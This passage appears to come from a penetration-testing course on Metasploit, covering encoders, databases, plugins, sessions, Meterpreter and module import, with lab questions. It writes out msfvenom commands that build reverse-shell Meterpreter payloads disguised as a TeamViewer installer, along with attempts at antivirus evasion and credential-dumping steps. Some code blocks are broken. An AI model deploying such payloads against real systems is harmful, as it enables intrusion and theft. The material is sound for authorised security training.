Besides these, of course, there are a plethora of other payloads out there. Some are for specific device vendors, such as Cisco, Apple, or PLCs. Some we can generate ourselves using¬†`msfvenom`. However, next up, we will look at¬†`Targets`¬†and how they can be used to influence the attack outcome.

## Encoders

* * * * *

Over the 15 years of existence of the Metasploit Framework,¬†`Encoders`¬†have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion.¬†`Encoders`¬†come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

| `x64` | `x86` | `sparc` | `ppc` | `mips` |
| --- | --- | --- | --- | --- |

They are also needed to remove hexadecimal opcodes known as¬†`bad characters`¬†from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (`‰ªïÊñπ„Åå„Å™„ÅÑ`) means¬†`It cannot be helped`¬†or¬†`Nothing can be done about it`, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems.¬†[This article from FireEye](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)¬†details the why and the how of Shikata Ga Nai's previous rule over the other encoders.

* * * * *

### Selecting an Encoder
--------------------

Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called¬†`msfpayload`¬†and¬†`msfencode`. These two tools are located in¬†`/usr/share/framework2/`.

If we wanted to create our custom payload, we could do so through¬†`msfpayload`, but we would have to encode it according to the target OS architecture using¬†`msfencode`¬†afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.

	msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

After 2015, updates to these scripts have combined them within the¬†`msfvenom`¬†tool, which takes care of payload generation and Encoding. We will be talking about¬†`msfvenom`¬†in detail later on. Below is an example of what payload generation would look like with today's¬†`msfvenom`:

#### Shikata Ga Nai Encoding

![[shikata_ga_nai.gif]]

Source: https://hatching.io/blog/metasploit-payloads2/

If we want to look at the functioning of the¬†`shikata_ga_nai`¬†encoder, we can look at an excellent post¬†[here](https://hatching.io/blog/metasploit-payloads2/).

Suppose we want to select an Encoder for an¬†`existing payload`. Then, we can use the¬†`show encoders`¬†command within the¬†`msfconsole`¬†to see which encoders are available for our current¬†`Exploit module + Payload`¬†combination.

	set payload 15

```text
payload => windows/x64/meterpreter/reverse_tcp
```

	show encoders

```text
Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

In the previous example, we only see a few encoders fit for x64 systems. Like the available payloads, these are automatically filtered according to the Exploit module only to display the compatible ones. For example, let us try the¬†`MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`.

	show encoders

   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

Take the above example just as that‚Äîa hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up¬†`msfvenom`, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:

	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

```text
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

This will generate a payload with the¬†`exe`¬†format, called TeamViewerInstall.exe, which is meant to work on x86 architecture processors for the Windows platform, with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. Let us take the result and upload it to VirusTotal.

![[S8_SS01.png]]

One better option would be to try running it through multiple iterations of the same Encoding scheme:

	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Payload size: 611 bytes
Final size of exe file: 73802 bytes
Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe
```

![[S8_SS02.png]]

As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called¬†`msf-virustotal`¬†that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.

As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion that are outside the scope of this module.

## Databases

* * * * *

`Databases`¬†in¬†`msfconsole`¬†are used to keep track of your results. It is no mystery that during even more complex machine assessments, much less entire networks, things can get a little fuzzy and complicated due to the sheer amount of search results, entry points, detected issues, discovered credentials, etc.

This is where Databases come into play.¬†`Msfconsole`¬†has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools. Database entries can also be used to configure Exploit module parameters with the already existing findings directly.

* * * * *

### Setting up the Database
-----------------------

First, we must ensure that the PostgreSQL server is up and running on our host machine. To do so, input the following command:

#### PostgreSQL Status

	sudo service postgresql status

```text
‚óè postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2147 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.
```

#### Start PostgreSQL

	sudo systemctl start postgresql

After starting PostgreSQL, we need to create and initialize the MSF database with¬†`msfdb init`.

#### MSF - Initiate a Database

	sudo msfdb init

```text
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
rake aborted!
NoMethodError: undefined method `without' for #<Bundler::Settings:0x000055dddcf8cba8>
Did you mean? with_options

<SNIP>
```

Sometimes an error can occur if Metasploit is not up to date. This difference that causes the error can happen for several reasons. First, often it helps to update Metasploit again (`apt update`) to solve this problem. Then we can try to reinitialize the MSF database.

	sudo msfdb init

```text
[i] Database already started
[i] The database appears to be already configured, skipping initialization
```

If the initialization is skipped and Metasploit tells us that the database is already configured, we can recheck the status of the database.

	sudo msfdb status

```text
‚óè postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago
    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2476 (code=exited, status=0/SUCCESS)

[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
```

If this error does not appear, which often happens after a fresh installation of Metasploit, then we will see the following when initializing the database:

	sudo msfdb init

```text
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

After the database has been initialized, we can start¬†`msfconsole`¬†and connect to the created database simultaneously.

#### MSF - Connect to the Initiated Database

	sudo msfdb run

```text

msf6>
```

If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:

#### MSF - Reinitiate the Database

	msfdb reinit
	cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
	sudo service postgres restart
	msfconsole -q

```text
msf6 >
```

	db_status

```text
[*] Connected to msf. Connection type: PostgreSQL.
```

Now, we are good to go. The¬†`msfconsole`¬†also offers integrated help for the database. This gives us a good overview of interacting with and using the database.

#### MSF - Database Options

	help database

```text

```

	db_status

```text
[*] Connected to msf. Connection type: postgresql.
```

* * * * *

### Using the Database
------------------

With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our¬†`Workspaces`.

#### Workspaces

We can think of¬†`Workspaces`¬†the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

To view the current Workspace list, use the¬†`workspace`¬†command. Adding a¬†`-a`¬†or¬†`-d`¬†switch after the command, followed by the workspace's name, will either¬†`add`¬†or¬†`delete`¬†that workspace to the database.

	workspace

```text
* default
```

Notice that the default Workspace is named¬†`default`¬†and is currently in use according to the¬†`*`¬†symbol. Type the¬†`workspace [name]`¬†command to switch the presently used workspace. Looking back at our example, let us create a workspace for this assessment and select it.

	workspace -a Target_1

```text
[*] Added workspace: Target_1
[*] Workspace: Target_1
```

	workspace Target_1 

```text
[*] Workspace: Target_1
```

	workspace

```text
  default
* Target_1
```

To see what else we can do with Workspaces, we can use the¬†`workspace -h`¬†command for the help menu related to Workspaces.

	workspace -h

```text
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information
```

* * * * *

### Importing Scan Results
----------------------

Next, let us assume we want to import a¬†`Nmap scan`¬†of a host into our Database's Workspace to understand the target better. We can use the¬†`db_import`¬†command for this. After the import is complete, we can check the presence of the host's information in our database by using the¬†`hosts`¬†and¬†`services`¬†commands. Note that the¬†`.xml`¬†file type is preferred for¬†`db_import`.

### Using Nmap Inside MSFconsole
----------------------------

Alternatively, we can use Nmap straight from msfconsole! To scan directly from the console without having to background or exit the process, use the¬†`db_nmap`¬†command.

#### MSF - Nmap

	db_nmap -sV -sS 10.10.10.8

```text

```

* * * * *

### Data Backup
-----------

After finishing the session, make sure to back up our data if anything happens with the PostgreSQL service. To do so, use the¬†`db_export`¬†command.

#### MSF - DB Export

	db_export -h

```text
Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified
```

	db_export -f xml backup.xml

```text
[*] Starting export of workspace default to backup.xml [ xml ]...
[*] Finished export of workspace default to backup.xml [ xml ]...
```

This data can be imported back to msfconsole later when needed. Other commands related to data retention are the extended use of¬†`hosts`,¬†`services`, and the¬†`creds`¬†and¬†`loot`¬†commands.

* * * * *

### Hosts
-----

The¬†`hosts`¬†command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions. For example, suppose¬†`msfconsole`¬†is linked with scanner plugins that can perform service and OS detection. In that case, this information should automatically appear in the table once the scans are completed through msfconsole. Again, tools like Nessus, NexPose, or Nmap will help us in these cases.

Hosts can also be manually added as separate entries in this table. After adding our custom hosts, we can also organize the format and structure of the table, add comments, change existing information, and more.

#### MSF - Stored Hosts

	hosts -h

```text
Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -C <col1,col2>    Only show the given columns until the next restart (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o <file>         Send output to a file in CSV format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host

```

* * * * *

### Services
--------

The¬†`services`¬†command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.

#### MSF - Stored Services of Hosts

	services -h

```text
Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at
```

* * * * *

### Credentials
-----------

The¬†`creds`¬†command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.

#### MSF - Stored Credentials

	creds -h

```text
With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.

  creds -t NTLM       # All NTLM creds
  creds -j md5        # All John the Ripper hash type MD5 creds

Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```

* * * * *

### Loot
----

The¬†`loot`¬†command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.

#### MSF - Stored Loot

	loot -h

```text
Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```

## Plugins & Mixins

* * * * *

Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework. These can represent commercial products that have a¬†`Community Edition`¬†for free use but with limited functionality, or they can be individual projects developed by individual people.

The use of plugins makes a pentester's life even easier, bringing the functionality of well-known software into the¬†`msfconsole`¬†or Metasploit Pro environments. Whereas before, we needed to cycle between different software to import and export results, setting options and parameters over and over again, now, with the use of plugins, everything is automatically documented by msfconsole into the database we are using and hosts, services and vulnerabilities are made available at-a-glance for the user.¬†[Plugins](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin)¬†work directly with the API and can be used to manipulate the entire framework. They can be useful for automating repetitive tasks, adding new commands to the¬†`msfconsole`, and extending the already powerful framework.

* * * * *

### Using Plugins
-------------

To start using a plugin, we will need to ensure it is installed in the correct directory on our machine. Navigating to¬†`/usr/share/metasploit-framework/plugins`, which is the default directory for every new installation of¬†`msfconsole`, should show us which plugins we have to our availability:

	ls /usr/share/metasploit-framework/plugins

```text
aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb
alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb
auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb
```

If the plugin is found here, we can fire it up inside¬†`msfconsole`¬†and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use:

#### MSF - Load Nessus

	load nessus

```text
[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus
```

	nessus_help

```text
Command                     Help Text
-------                     ---------
Generic Commands            
-----------------           -----------------
nessus_connect              Connect to a Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with a different username and 

<SNIP>

nessus_user_del             Delete a Nessus User
nessus_user_passwd          Change Nessus Users Password
                            
Policy Commands             
-----------------           -----------------
nessus_policy_list          List all polciies
nessus_policy_del           Delete a policy
```

If the plugin is not installed correctly, we will receive the following error upon trying to load it.

	load Plugin_That_Does_Not_Exist

```text
[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb
```

To start using the plugin, start issuing the commands available to us in the help menu of that specific plugin. Each cross-platform integration offers us a unique set of interactions that we can use during our assessments, so it is helpful to read up on each of these before employing them to get the most out of having them at our fingertips.

* * * * *

### Installing new Plugins
----------------------

New, more popular plugins are installed with each update of the Parrot OS distro as they are pushed out towards the public by their makers, collected in the Parrot update repo. To install new custom plugins not included in new updates of the distro, we can take the .rb file provided on the maker's page and place it in the folder at¬†`/usr/share/metasploit-framework/plugins`¬†with the proper permissions.

For example, let us try installing¬†[DarkOperator's Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins.git). Then, following the link above, we get a couple of Ruby (`.rb`) files which we can directly place in the folder mentioned above.

#### Downloading MSF Plugins

	git clone https://github.com/darkoperator/Metasploit-Plugins
	ls Metasploit-Plugins

```text
aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

Here we can take the plugin¬†`pentest.rb`¬†as an example and copy it to¬†`/usr/share/metasploit-framework/plugins`.

#### MSF - Copying Plugin to MSF

	sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb

Afterward, launch¬†`msfconsole`¬†and check the plugin's installation by running the¬†`load`¬†command. After the plugin has been loaded, the¬†`help menu`¬†at the¬†`msfconsole`¬†is automatically extended by additional functions.

#### MSF - Load Plugin

	msfconsole -q
	load pentest

* * * * *

### Mixins
------

The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes¬†`msfconsole`¬†excellent to use. Mixins are one of those features that, when implemented, offer a large amount of flexibility to both the creator of the script and the user.

Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:

1.  Want to provide a lot of optional features for a class.
2.  Want to use one particular feature for a multitude of classes.

Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word¬†`include`, to which we pass the name of the module as a¬†`parameter`. We can read more about mixins¬†[here](https://en.wikibooks.org/wiki/Metasploit/UsingMixins).

If we are just starting with Metasploit, we should not worry about the use of Mixins or their impact on our assessment. However, they are mentioned here as a note of how complex the customization of Metasploit can become.

# MSF Sessions

## Sessions & Jobs

* * * * *

MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of¬†`Sessions`, which creates dedicated control interfaces for all of your deployed modules.

Once several sessions are created, we can switch between them and link a different module to one of the backgrounded sessions to run on it or turn them into jobs. Note that once a session is placed in the background, it will continue to run, and our connection to the target host will persist. Sessions can, however, die if something goes wrong during the payload runtime, causing the communication channel to tear down.

* * * * *

### Using Sessions
--------------

While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the¬†`[CTRL] + [Z]`¬†key combination or by typing the¬†`background`¬†command in the case of Meterpreter stages. This will prompt us with a confirmation message. After accepting the prompt, we will be taken back to the msfconsole prompt (`msf6 >`) and will immediately be able to launch a different module.

#### Listing Active Sessions

We can use the¬†`sessions`¬†command to view our currently active sessions.

	sessions

```text
Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

#### Interacting with a Session

You can use the¬†`sessions -i [no.]`¬†command to open up a specific session.

	sessions -i 1

```text
[*] Starting interaction with 1...

meterpreter > 
```

This is specifically useful when we want to run an additional module on an already exploited system with a formed, stable communication channel.

This can be done by backgrounding our current session, which is formed due to the success of the first exploit, searching for the second module we wish to run, and, if made possible by the type of module selected, selecting the session number on which the module should be run. This can be done from the second module's¬†`show options`¬†menu.

Usually, these modules can be found in the¬†`post`¬†category, referring to Post-Exploitation modules. The main archetypes of modules in this category consist of credential gatherers, local exploit suggesters, and internal network scanners.

* * * * *

### Jobs
----

If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using¬†`[CTRL] + [C]`. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the¬†`jobs`¬†command to look at the currently active tasks running in the background and terminate the old ones to free up the port.

Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.

#### Viewing the Jobs Command Help Menu

We can view the help menu for this command, like others, by typing¬†`jobs -h`.

	jobs -h

```text
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

#### Viewing the Exploit Command Help Menu

When we run an exploit, we can run it as a job by typing¬†`exploit -j`. Per the help menu for the¬†`exploit`¬†command, adding¬†`-j`¬†to our command. Instead of just¬†`exploit`¬†or¬†`run`, will "run it in the context of a job."

	exploit -h

```text
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP>
```

#### Running an Exploit as a Background Job

	exploit -j

```text
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444

#### Listing Running Jobs

To list all running jobs, we can use the¬†`jobs -l`¬†command. To kill a specific job, look at the index no. of the job and use the¬†`kill [index no.]`¬†command. Use the¬†`jobs -K`¬†command to kill all running jobs.

#### Questions

>The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

>Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

>The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

## Meterpreter

* * * * *

The¬†`Meterpreter`¬†Payload is a specific type of multi-faceted, extensible Payload that uses¬†`DLL injection`¬†to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.

For some interesting reading, check out this¬†[post](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)¬†on Meterpreter stageless payloads and this¬†[post](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion)¬†on modifying Metasploit templates for evasion. These topics are outside the scope of this module, but we should be awarer of these possibilities.

* * * * *

### Running Meterpreter
-------------------

To run Meterpreter, we only need to select any version of it from the¬†`show payloads`¬†output, taking into consideration the type of connection and OS we are attacking.

When the exploit is completed, the following events occur:

-   The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.

-   The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.

-   The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.

-   Lastly, Meterpreter loads extensions. It will always load¬†`stdapi`¬†and load¬†`priv`¬†if the module gives administrative rights. All of these extensions are loaded over AES encryption.

Whenever the Meterpreter Payload is sent and run on the target system, we receive a¬†`Meterpreter shell`. We can then immediately issue the¬†`help`¬†command to see what the Meterpreter shell is capable of.

Some of these commands are also available in the module cheat sheet for reference.

The main idea we need to get about Meterpreter is that it is just as good as getting a direct shell on the target OS but with more functionality. The developers of Meterpreter set clear design goals for the project to skyrocket in usability in the future. Meterpreter needs to be:

-   Stealthy
-   Powerful
-   Extensible

* * * * *

### Stealthy
--------

Meterpreter, when launched and after arriving on the target, resides entirely in memory and writes nothing to the disk. No new processes are created either as Meterpreter injects itself into a compromised process. Moreover, it can perform process migrations from one running process to another.

With the now updated msfconsole-v6, all Meterpreter payload communications between the target host and us are encrypted using AES to ensure confidentiality and integrity of data communications.

All of these provide limited forensic evidence to be found and also little impact on the victim machine.

* * * * *

### Powerful
--------

Meterpreter's use of a channelized communication system between the target host and the attacker proves very useful. We can notice this first-hand when we immediately spawn a host-OS shell inside of our Meterpreter stage by opening a dedicated channel for it. This also allows for the use of AES-encrypted traffic.

* * * * *

### Extensible
----------

Meterpreter's features can constantly be augmented at runtime and loaded over the network. Its modular structure also allows new functionality to be added without rebuilding it.

* * * * *

### Using Meterpreter
-----------------

We have already delved into the basics of Meterpreter in the Payloads section. Now, we will look at the real strengths of the Meterpreter shell and how it can bolster the assessment's effectiveness and save time during an engagement. We start by running a basic scan against a known target. We will do this a-la-carte, doing everything from inside msfconsole to benefit from the data tracking on our target.

Next, we look up some information about the services running on this box. Specifically, we want to explore port 80 and what kind of web service is hosted there.

	http://10.10.10.15:80

![[S12_SS01.png]]

We notice it is an under-construction website‚Äînothing web-related to see here. However, looking at both the end of the webpage and the result of the Nmap scan more closely, we notice that the server is running¬†`Microsoft IIS httpd 6.0`. So we further our research in that direction, searching for common vulnerabilities for this version of IIS. After some searching, we find the following marker for a widespread vulnerability:¬†`CVE-2017-7269`. It also has a Metasploit module developed for it.

```

We have our Meterpreter shell. However, take a close look at the output above. We can see a¬†`.asp`¬†file named¬†`metasploit28857905`¬†exists on the target system at this very moment. Once the Meterpreter shell is obtained, as mentioned before, it will reside within memory. Therefore, the file is not needed, and removal was attempted by¬†`msfconsole`, which failed due to access permissions. Leaving traces like these is not beneficial to the attacker and creates a huge liability.

From the sysadmin's perspective, finding files that match this name type or slight variations of it can prove beneficial to stopping an attack in the middle of its tracks. Targeting regex matches against filenames or signatures as above will not even allow an attacker to spawn a Meterpreter shell before being cut down by the correctly configured security measures.

We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.

Now that we have established at least some privilege level in the system, it is time to escalate that privilege.

We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.

From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.

#### Questions

>Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

>Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

# Additional Features

## Writing and Importing Modules

* * * * *

To install any new Metasploit modules which have already been ported over by other users, one can choose to update their¬†`msfconsole`¬†from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of¬†`msfconsole`. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.

However, if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually. We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of¬†`msfconsole`¬†locally.

[ExploitDB](https://www.exploit-db.com/)¬†is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is¬†[Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the¬†`msfconsole`.

	https://www.exploit-db.com/?tag=3

![[exploit-db.png]]

Let's say we want to use an exploit found for¬†`Nagios3`, which will take advantage of a command injection vulnerability. The module we are looking for is¬†`Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)`. So we fire up¬†`msfconsole`¬†and try to search for that specific exploit, but we cannot find it. This means that our Metasploit framework is not up to date or that the specific¬†`Nagios3`¬†exploit module we are looking for is not in the official updated release of the Metasploit Framework.

We can, however, find the exploit code¬†[inside ExploitDB's entries](https://www.exploit-db.com/exploits/9861). Alternatively, if we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version,¬†`searchsploit`.

